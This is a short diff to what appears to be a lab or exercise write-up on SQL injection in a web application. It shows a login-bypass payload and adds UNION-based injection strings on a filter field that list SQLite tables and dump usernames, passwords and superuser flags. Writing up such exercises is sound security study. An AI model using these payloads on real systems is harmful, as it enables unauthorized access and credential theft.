@@ -18,4 +18,10 @@ Trying to login in with the username `a'or 1=1--` and a random password, will lo
 
 #### sqli on section 4
 
-TODO
+All the following queries are on the filter field
+
+To get list of tables and columns in each one:
+`fsda' UNION SELECT tbl_name,sql,3,4 FROM sqlite_schema WHERE type='table'--`
+
+To get the users database:
+`fsda' UNION SELECT username,password,is_superuser,4 FROM website_user --`
